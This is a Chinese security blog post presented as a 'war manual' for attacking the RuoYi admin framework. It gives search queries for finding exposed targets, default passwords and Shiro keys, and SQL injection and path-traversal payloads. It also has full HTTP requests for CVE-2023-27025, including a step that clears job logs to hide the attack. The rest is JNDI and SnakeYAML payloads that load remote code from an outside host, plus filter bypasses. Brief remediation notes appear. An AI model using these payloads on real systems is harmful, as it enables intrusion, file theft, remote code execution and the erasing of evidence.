#  若依(RuoYi)框架漏洞战争手册   
Locks_  蓝云Sec   2025-05-07 01:25  
  
# 0x00 前言  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmW0dIibUx5axibnlGYzBbtkib4onmv8yQGmyN2d6cTJtJziarub5DZDLrFw/640?wx_fmt=png&from=appmsg "")  
## 简介  
  
Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
  
若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmy2fs56tmHSgFKqO6BoRAFB16KEeBEYtx9WbmbibCbYZHJ7G9KDfBniag/640?wx_fmt=png&from=appmsg "")  
## 配合ruoyi的服务：  
```
alibaba druid          
alibaba nacos          
spring            
redis            
mysql            
minio            
fastjson            
shiro            
swagger-ui.html          
mybatis

```  
## 搜索语法  
  
FOFA：  
```
(icon_hash="-1231872293" || icon_hash="706913071")

```  
  
Hunter：  
```
web.body="若依后台管理系统"

```  
## 环境搭建  
  
新建文件夹，拉起ruoyi源码  
```
git clone https://gitee.com/y_project/RuoYi

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmWEQn8YIhtdyibvFH2cRoj5PklqfsGhgNWQCia1UokJrT4kX3wypnDxEQ/640?wx_fmt=png&from=appmsg "")  
```
cd RuoYi 
切换版本
git tag -l
切换
git checkout v4.5.1

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmcia0dJwNorQAibsnrqYj9OF7tHpXRyfk8X68So7SYSg2FJqECJwB3nLg/640?wx_fmt=png&from=appmsg "")  
  
接下来用idea搭建的  
mysql正常用phpstudy搭建就行  
日志存放路径需要修改  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm4AOfiaT4TFEIRqZpRlIJVrDudzNZ8eIBPYLoYibsjTn6n2rLUS9gGUIA/640?wx_fmt=png&from=appmsg "")  
  
配置mysql  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmyURbtASrJ1iafHQCNktM0DXYiaG1HLdl9rXneCjD0Oyict9RUaREYCFkg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmUtD9dE8CKGYOYZOKlh9OUQtwsM9AibebjNFml5icsqc0FwTw5NBHCR9g/640?wx_fmt=png&from=appmsg "")  
  
启动即可，默认端口80  
# 0x01 弱口令  
```
用户：admin ruoyi druid            
密码：123456 admin druid admin123 admin888

```  
# 0x02 Shiro默认密钥  
## 漏洞简介  
  
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。  
## 影响版本  
  
RuoYi<V-4.6.2  
## 漏洞复现  
  
在配置文件中，能够看到shiro的密钥是在配置文件中的  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmiaQvibJBrcJswgWZApwia9sKARQ0AQJjWLxeZTsF1bib2b4zh6QWr8FG0w/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用工具地址  
https://github.com/SummerSec/ShiroAttack2  
- RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmInxSUSwR548Vpfm50uiar5tI7BVFzO9ltqUnl4st7PMzVnEibaBP15bg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmcIHenqtVknR3GYTUsmc83RPxIj6LbA4V2sVUvglKQwSZ20UD17YAeA/640?wx_fmt=png&from=appmsg "")  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">RuoYi 版本号</span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">对象版本的默认AES密钥</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">4.6.1-4.3.1</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(246, 248, 250);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">3.4-及以下</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></section></td></tr></tbody></table>- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。  
  
# 0x03 SQL注入  
### 注入点1 /role/list接口 （<V-4.6.2）  
  
版本同上4.5.1  
首先从源码分析一波  
Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm4TmpoI8DaqGoExOkTeGxLuia0jeW7JmodyD6lIbb5QNm9MibRibibhmOLg/640?wx_fmt=png&from=appmsg "")  
  
跳转  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmiaU0jh4vUib5bwFXFsS84Au2oPXB5af9a2XqVnSRDY6gLwnscJEnow9A/640?wx_fmt=png&from=appmsg "")  
  
解释一下 ${params.dataScope}  
  
${params.dataScope}  
这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的${...}  
语法表示取出params  
对象中名为dataScope  
的属性值，并将其直接嵌入到SQL语句中。  
  
例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，  
dataScope的值可以是一个根据用户角色动态生成的SQL片段，如  
"AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #{userId})"，用以限定查询结果只包含特定部门的用户信息。  
  
可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后  
  
进入mapper层  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm4paQtoxku6yFoHrG30NJDVRoldAI8HJGJ8BLGDNsskYxYBtgICNib1Q/640?wx_fmt=png&from=appmsg "")  
  
跳转到上级  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmN1xsuzxkZwialjynnniafMSibmrx39pcmST2QNJedam9VWhl9exSgWGNA/640?wx_fmt=png&from=appmsg "")  
  
进入role查看信息  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm0thqArCDO7T9pZE1WDwNGEXuK5l9iaSs97e16G3asFaRjEKzWaniaiadg/640?wx_fmt=png&from=appmsg "")  
  
查看功能  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmUR3ic99pNUrAhlOJs1zExwZhMiatibnVOziaf8US8XBt046dtbZ0qpQZeA/640?wx_fmt=png&from=appmsg "")  
  
params  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmRrzmnOBZAFrEL0vSwvp9gpQrmokrgXGdXGxCEqsWXJIsmQGiartanTw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm9rIwmicLm5C3hDcB3pLwwibryyHjyGtS24jUHoXfTzCSpjA2xCZhnd2g/640?wx_fmt=png&from=appmsg "")  
  
根据路径  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmAIWkZf4osnGGfOWhkCuFpgJuaKVe7h288UDiclmx7kEWicXup8GbwsYA/640?wx_fmt=png&from=appmsg "")  
  
执行代码  
```
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmWhZpvkibAWA1crRlZEYicU39mozFtt5Bib6PnB8ia8Sibe9FicEBcH7zUq0g/640?wx_fmt=png&from=appmsg "")  
### 注入点2 /role/export （<V-4.6.2）  
### 注入点3 /user/list （<V-4.6.2）  
### 注入点4 /user/list （<V-4.6.2）  
### 注入点5 /dept/list （<V-4.6.2）  
### 注入点6 /role/authUser/allocatedList （<V-4.6.2）  
### 注入点7 /role/authUser/unallocatedList  
### 注入点8 /dept/edit （<V-4.6.2）  
```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#

```  
### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）  
  
参考  
https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93  
# 0x04 CNVD-2021-01931任意文件下载  
#### 漏洞简介  
  
登录后台后可以读取服务器上的任意文件。  
#### 影响版本：  
  
RuoYi<4.5.1  
#### 漏洞复现  
  
用4.5.0版本  
直接搜索关键字，download找到具体的controller  
路径  
```
/common/download/resource

```  
```
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmxK9sauBevNN0PngJwzTbT2lrdlDbQFMNVzCjgTib5j8t8ZNTCf32MGA/640?wx_fmt=png&from=appmsg "")  
# 0x05 CVE-2023-27025 若依任意文件下载  
## 漏洞简介  
  
该漏洞是若依（RuoYi）4.7.6 版本中存在的 **权限绕过 + 任意文件下载**  
 组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是 **权限控制缺失**  
（允许低权限用户操作敏感接口）和 **路径校验不严**  
（未对动态修改的配置路径进行二次校验）的综合结果。  
## 影响版本  
- **若依（RuoYi）<= 4.7.6**  
## 利用条件  
1. **权限要求**  
：  
  
1. 攻击者需获取管理员 Cookie（如 JSESSIONID  
）或存在其他权限绕过漏洞。  
  
1. 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。  
  
1. **系统配置**  
：  
  
1. 目标系统启用了定时任务模块（默认开启）。  
  
## 漏洞复现  
#### 添加任务绕过白名单（自定义下载文件路径）  
```
POST /monitor/job/add HTTP/1.1
Host: 10.40.107.67
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 214Connection: closecreateBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
- 通过调用 ruoYiConfig.setProfile()  
 方法，将系统配置文件路径动态修改为攻击者指定的路径（如 /Users/apple/Desktop/Locks/javafx.txt  
）。  
  
- 此操作绕过了下载功能原本的“固定目录白名单”限制，将下载路径指向自定义位置。  
  
#### 执行定时任务（触发配置修改）  
```
POST /monitor/job/run HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 9Connection: closejobId=117
```  
- 立即执行 jobId=117  
 对应的定时任务，触发 ruoYiConfig.setProfile()  
 方法调用，完成配置文件路径的修改。  
  
- 修改后，系统将从新的配置路径（攻击者指定路径）读取文件。  
  
#### 清理任务日志（擦除攻击痕迹）  
```
POST /monitor/jobLog/clean HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 0Connection: close
```  
- 删除任务执行日志，避免管理员发现恶意任务记录。  
  
- 此步骤非漏洞必要环节，但常用于隐蔽攻击行为。  
  
#### 触发任意文件下载  
```
GET /common/download/resource?resource=2.txt HTTP/1.1
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 10.40.107.67
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: close
```  
- 下载功能仅校验“配置文件中的路径”，未对动态修改后的路径进行二次白名单校验。  
  
## bypass  
  
对路径参数进行 URL 编码或 Unicode 编码，绕过 WAF 检测：  
```
invokeTarget=ruoYiConfig.setProfile('%2F%65%74%63%2F%70%61%73%73%77%64')

```  
## 修复  
1. **官方补丁**  
：  
  
1. 升级若依至 **4.7.6 以上版本**  
，官方已修复权限校验和路径白名单问题。  
  
1. **代码级修复**  
：  
  
1. **权限校验**  
：对 /monitor/job/add  
 等后台接口添加严格的角色权限控制。  
  
1. **方法黑名单**  
：禁止 invokeTarget  
 参数调用敏感类方法（如 ruoYiConfig.setProfile  
）。  
  
1.   
1. **路径二次校验**  
：在下载功能中强制校验文件路径是否在合法白名单内。  
  
1. **临时缓解**  
：  
  
1. 禁用后台任务调度功能，或限制 monitor  
 模块的访问权限。  
  
1. 部署 WAF 拦截包含 ruoYiConfig.setProfile  
 特征的请求。  
  
# 0x06 定时任务RCE  
  
由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。  
## 0x01 简介  
  
RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。  
## 0x02 漏洞概述  
  
若依最新后台定时任务SQL注入可导致RCE漏洞  
## 0x03 影响版本  
  
v4.7.8  
## 0x04 环境搭建  
- RuoYi 官网地址：http://ruoyi.vip(opens new window)  
  
- RuoYi 在线文档：http://doc.ruoyi.vip(opens new window)  
  
- RuoYi 源码下载：https://gitee.com/y_project/RuoYi(opens new window)  
  
使用phpstudy启动mysql  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmPqVpd60uvlNI4r0wic3dpTTFZeicNAdXojXD9RiaNBT9jm5DFBUaj9Dvw/640?wx_fmt=png&from=appmsg "")  
  
创建数据库ry  
导入sql到ry数据库中  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmwI1PPsvNJ6VI8k3kpibeB9nxOZhJDenn3DtZPvbrwfSeLM7EUdFtcrQ/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmQxzMKTav19cLJ3NK92z8nKrriaA7ebHYhjXOm3Ptnu4sW14xAcA6O5w/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm1LVCbpNOYT9dU5A3BrV6rFUtBziblCTIIrTHN5ksvzucGHia6UMJsO8g/640?wx_fmt=png&from=appmsg "")  
  
将ruoyi-admin下的application-druid.yml文件配置数据库账号密码  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmn1DPyvkslHSQLkXms9wHdk7q2JwaVtLas7FrhuHCb69sNL3xctq0Hw/640?wx_fmt=png&from=appmsg "")  
  
启动成功  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmnHp0oKQbt0EdGugutv2tF81RBPyTmM2KJl1EiacYKxUDInIBicKMibqng/640?wx_fmt=png&from=appmsg "")  
  
若依漏洞复现环境搭建成功  
```
admin
admin123

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmGWXruxhhQQmDMQHXJnqe3hsXpsiaicHzDMw0eeEjqcNAdsYK2v0RuY1Q/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
系统监控下定时任务中存在SQL注入漏洞  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmddXIrSA5o0lE0uKX8CH6XmOGkMmLzRwajPicYujgSFefbDVWCzmglZg/640?wx_fmt=png&from=appmsg "")  
  
在补丁中，使用了黑名单和白名单的策略。  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmqicZ7YsVhfHibF07rADXt9gWajtibiaIIjoodG2BwQHjR2Ria6d0C0QzhJg/640?wx_fmt=png&from=appmsg "")  
  
SQL注入漏洞点  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm3Y41YNt06QuoiarPruy4juYT2fuiaXFR9uIuSqG5M1c9xqOu4t4AN5Kg/640?wx_fmt=png&from=appmsg "")  
  
开始复现  
RCE payload  
JNDI  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')

```  
  
payload中可以执行反弹shell、漏洞探测、命令执行功能  
DNSLOG  
```
javax.naming.InitialContext.lookup('ldap://dnslog')

```  
  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmZaXpHibaW0kPdMzgHkJ2tnPof6KO7OZR9Opuxg4TzibSJVLtCV9JWxdw/640?wx_fmt=png&from=appmsg "")  
```
6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729

```  
  
第一步：运行此命令  
成功地绕过了它，并成功地执行  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')

```  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th><th style="box-sizing: border-box;padding: 6px 13px;text-align: left;font-weight: 600;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf=""><br/></span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-top: 1px solid rgb(216, 222, 228);"><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">分钟</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">小时</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">日</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">月</span></section></td><td style="box-sizing: border-box;padding: 6px 13px;border-color: rgb(208, 215, 222);border-style: solid;border-width: 1px;border-image: none 100% / 1 / 0 stretch;"><section><span leaf="">星期</span></section></td></tr></tbody></table>```
* * * * * ?

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmjHS6FyeKp5ibrZHjXiavzpgaj6jTU4RuKQK8yWNjMn5wUFpV77icbgYTA/640?wx_fmt=png&from=appmsg "")  
  
第二步：  
修改执行命令  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmvaiaJymlxlkicddG28icTxJYEqFkl7UTIdjhIyQxDORicxibKjG5qaLoTcw/640?wx_fmt=png&from=appmsg "")  
  
第三步：  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')

```  
  
创建任务  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmXChlRMjt7pCIc3gBicgyNYibibZAohv6SgZricouxRRmJhhDj3flicEiarTw/640?wx_fmt=png&from=appmsg "")  
  
执行一次  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLm2KsL2nMbANFswKSwFz1Ij6DE2HlLUJV9iayAgpgNOYZicIfIicRDlr3icg/640?wx_fmt=png&from=appmsg "")  
  
执行被修改的任务之前需要开启JNDI  
需要下载cckuailong师傅的JNDI-Injection-Exploit-Plus项目(https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/tag/2.3)。  
jdk版本要求1.8  
```
java -jar '.\JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar' -C calc -A 127.0.0.1

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmqrobakD7eKY9nHeGKQpBM1N2Ios9RLjNbSCMC6cic4hwreic5WKNav6w/640?wx_fmt=png&from=appmsg "")  
  
执行被修改的1任务  
JNDI  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')

```  
  
payload中可以执行反弹shell、漏洞探测、命令执行功能  
DNSLOG  
```
javax.naming.InitialContext.lookup('ldap://dnslog')

```  
  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改  
https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmZaXpHibaW0kPdMzgHkJ2tnPof6KO7OZR9Opuxg4TzibSJVLtCV9JWxdw/640?wx_fmt=png&from=appmsg "")  
```
0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7263793870732e646e736c6f672e636e2729

```  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729 WHERE job_id = 1;')

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmp3icrFIOFgkesI43HNiciahBwKf46uqbV9JSP0uB0tCSvuT3Za5tdlUDg/640?wx_fmt=png&from=appmsg "")  
  
我们再来试试dnslog  
```
javax.naming.InitialContext.lookup('ldap://rcy8ps.dnslog.cn')

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmzcImuQyXc2bW5ysDj2EF907wNIUQnUXAw5XQynOhnfbgvN0dicoqG1w/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmMhs4gHEbP3ibaTBlJZz6fOn93EEFB9F0VbkEdbaib4BgBeq7wuVf4ibVw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmroicTLrkCGUSbOgQEaAbibx33AiaefcjWKYWjn3AqRRbwZT6HSibibss5mA/640?wx_fmt=png&from=appmsg "")  
  
工具使用：  
https://github.com/charonlight/RuoYiExploitGUI  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmsiamknFYapS7QGm0drxNeqUmPzEVgLAamrs18D3rQk40Q8OsIXGEYog/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmI66OroPnQpyic7nwoUJ7POUegJgOfXzEUhnEqwE8u9sFiclSYcBcYFgA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmOet1VGae1MlPVW3eVmE8Hq5P1TFRsD6dZ9cKPvfvFjyzicEmlQqYXiag/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
1、升级版本。  
## 0x07 bypass  
### 版本4.6.2<=Ruoyi<4.7.2  
  
这个版本采用了黑名单限制调用字符串  
- 定时任务屏蔽ldap远程调用  
  
- 定时任务屏蔽http(s)远程调用  
  
- 定时任务屏蔽rmi远程调用  
  
**Bypass**  
咱们只需要在屏蔽的协议加上单引号,接着采用之前的方式例如:  
```
org.yaml.snakeyaml.Yaml.load(’!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“**h’t’t’p’:**//127.0.0.1:88/yaml-payload.jar”]]]]’)

```  
# 0x07 fastjson反序列化  
  
关注两个函数 parse 和 parseObject JSONObject.parse  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmzqPjULcdFnqNWjTW4KfNHvSkqhWJjoA4t4gUZIozWOlEe7jMteokcw/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK518samlbiamp3OsRthe8FLmPAkQUlA6GNUTsibbZzXmJueOB5qDtEWylYaSR3d1NQU7iaDCnYrOaCvA/640?wx_fmt=png&from=appmsg "")  
  
